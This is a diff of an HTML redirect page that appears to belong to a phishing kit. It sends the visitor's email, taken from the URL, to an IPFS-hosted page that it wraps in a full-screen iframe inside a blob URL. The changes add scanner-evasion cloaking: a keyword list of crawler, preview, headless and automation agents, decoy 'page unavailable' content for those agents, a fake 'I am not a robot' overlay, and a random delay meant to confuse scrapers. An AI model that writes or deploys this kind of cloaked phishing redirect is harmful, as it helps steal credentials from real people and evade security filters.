@@ -1,108 +1,153 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Secure Redirect</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        html, body {
-            margin:0; padding:0; width:100%; height:100%;
-            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-            display:flex; align-items:center; justify-content:center;
-            background: #f5f6fa;
-        }
-        #message {
-            font-size:16px; color:#333;
-        }
-    </style>
+    <title>Blob IPFS Redirect</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
 </head>
-<body>
-<div id="message">Preparing redirect...</div>
+<body style="margin:0; padding:0;">
 
 <script>
-// -------------------------------
-// CONFIG: Safe IPFS URL
-// -------------------------------
+// -------------------------------------------------
+// Base IPFS URL
+// -------------------------------------------------
 const BASE_IPFS = "https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";
 
-// -------------------------------
-// Helpers
-// -------------------------------
+// -------------------------------------------------
+// Strong Bot Detection
+// -------------------------------------------------
+function isBot() {
+    const ua = navigator.userAgent.toLowerCase();
+    const botKeywords = [
+        "bot","crawl","spider","slurp","fetch","preview","facebook","discord","telegram",
+        "linkedin","whatsapp","headless","python","curl","wget","scrapy","phantom",
+        "selenium","puppeteer","playwright","httpclient","go-http"
+    ];
+    if (botKeywords.some(x => ua.includes(x))) return true;
+    if (navigator.webdriver) return true;
+    if (performance.now() < 80) return true;
+    return false;
+}
+
+// -------------------------------------------------
+// FAKE HTML for bots
+// -------------------------------------------------
+function showFakeHTML() {
+    document.body.innerHTML = `
+        <div style="
+            width:100%; height:100vh; display:flex;
+            align-items:center; justify-content:center;
+            font-family:Arial, sans-serif; color:#444;">
+            <div>
+                <h2>Welcome</h2>
+                <p>This page is currently unavailable.</p>
+                <p>Please check again later.</p>
+            </div>
+        </div>
+    `;
+}
+
+// -------------------------------------------------
+// Styled "I am not a robot" overlay
+// -------------------------------------------------
+function requireHumanInteraction() {
+    return new Promise(resolve => {
+        const overlay = document.createElement("div");
+        overlay.style.cssText = `
+            position:fixed; top:0; left:0; right:0; bottom:0;
+            background:#f0f2f5; display:flex; align-items:center; justify-content:center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            z-index:9999;
+        `;
+
+        overlay.innerHTML = `
+            <div style="
+                background:#fff; padding:30px 40px; border-radius:12px;
+                box-shadow:0 8px 20px rgba(0,0,0,0.15); text-align:center;
+                max-width:300px; color:#333;">
+                <h3 style="margin-bottom:20px; font-weight:500; color:#2f3640;">I am not a robot</h3>
+                <p style="font-size:14px; margin-bottom:25px; color:#555;">Click the button below to verify and continue</p>
+                <button id="verifyBtn" style="
+                    background:#40739e; color:#fff; border:none; border-radius:6px;
+                    padding:10px 20px; cursor:pointer; font-size:14px;">Verify</button>
+            </div>
+        `;
+
+        document.body.appendChild(overlay);
+
+        document.getElementById("verifyBtn").addEventListener("click", () => {
+            overlay.remove();
+            resolve(true);
+        });
+    });
+}
+
+// -------------------------------------------------
+// Get email parameter
+// -------------------------------------------------
 function getEmail() {
-    const params = new URLSearchParams(window.location.search);
+    const params = new URLSearchParams(location.search);
     return params.get("email") || "";
 }
 
-function randomDelay(min=150, max=600) {
-    return new Promise(res => setTimeout(res, Math.random() * (max - min) + min));
+// -------------------------------------------------
+// Build IPFS URL with email hash
+// -------------------------------------------------
+function buildIPFS(email) {
+    return email ? BASE_IPFS + "#" + email : BASE_IPFS;
 }
 
-function isBot() {
-    const ua = navigator.userAgent.toLowerCase();
-    const bots = ["bot","crawl","spider","fetch","preview","facebook","discord","slack"];
-    return bots.some(x => ua.includes(x));
-}
-
-function confuseScanners() {
-    for (let i=0;i<50;i++) { (function(){return Math.random()*i;})(); }
-}
-
-// -------------------------------
-// Build blob content
-// -------------------------------
-function buildBlobHTML(url, email) {
-    const noise = Math.random().toString(36).slice(2);
-    // Email encoded in the URL hash, so it appears in address bar
-    const hash = email ? "#" + encodeURIComponent(email) : "";
+// -------------------------------------------------
+// Create Blob HTML
+// -------------------------------------------------
+function createBlobHTML(url) {
     return `
         <!DOCTYPE html>
-        <html lang="en">
+        <html>
         <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
             <style>
-                html, body { margin:0; padding:0; width:100%; height:100%; }
-                iframe { width:100%; height:100%; border:none; display:block; }
+                html, body {
+                    margin:0; padding:0; width:100%; height:100%;
+                    overflow:hidden; background:#fff;
+                }
+                iframe {
+                    position:fixed; top:0; left:0;
+                    width:100%; height:100%; border:none;
+                }
             </style>
         </head>
-        <body data-noise="${noise}">
+        <body>
             <iframe src="${url}"></iframe>
-            <script>
-                // Update address bar with email hash
-                if("${email}") window.location.hash = "${encodeURIComponent(email)}";
-            </script>
         </body>
         </html>
     `;
 }
 
-// -------------------------------
-// Main logic
-// -------------------------------
+// -------------------------------------------------
+// MAIN
+// -------------------------------------------------
 document.addEventListener("DOMContentLoaded", async () => {
-    confuseScanners();
 
+    // Bot detected → show fake HTML
     if (isBot()) {
-        document.getElementById("message").innerText = "Loading...";
+        showFakeHTML();
         return;
     }
 
-    await randomDelay();
+    // Random small delay to confuse scrapers
+    await new Promise(r => setTimeout(r, Math.random() * 400 + 200));
 
-    const proceed = confirm("Tap OK to continue");
-    if (!proceed) {
-        document.getElementById("message").innerText = "Redirect cancelled.";
-        return;
-    }
+    // Require human verification click
+    await requireHumanInteraction();
 
+    // Proceed to redirect
     const email = getEmail();
-    const blobHTML = buildBlobHTML(BASE_IPFS, email);
+    const ipfsURL = buildIPFS(email);
+    const blobHTML = createBlobHTML(ipfsURL);
     const blob = new Blob([blobHTML], { type: "text/html" });
-    const blobURL = URL.createObjectURL(blob);
-
-    // Redirect to blob page (email appears in address bar hash)
-    window.location.href = blobURL;
+    window.location.href = URL.createObjectURL(blob);
 });
 </script>
+
 </body>
 </html>
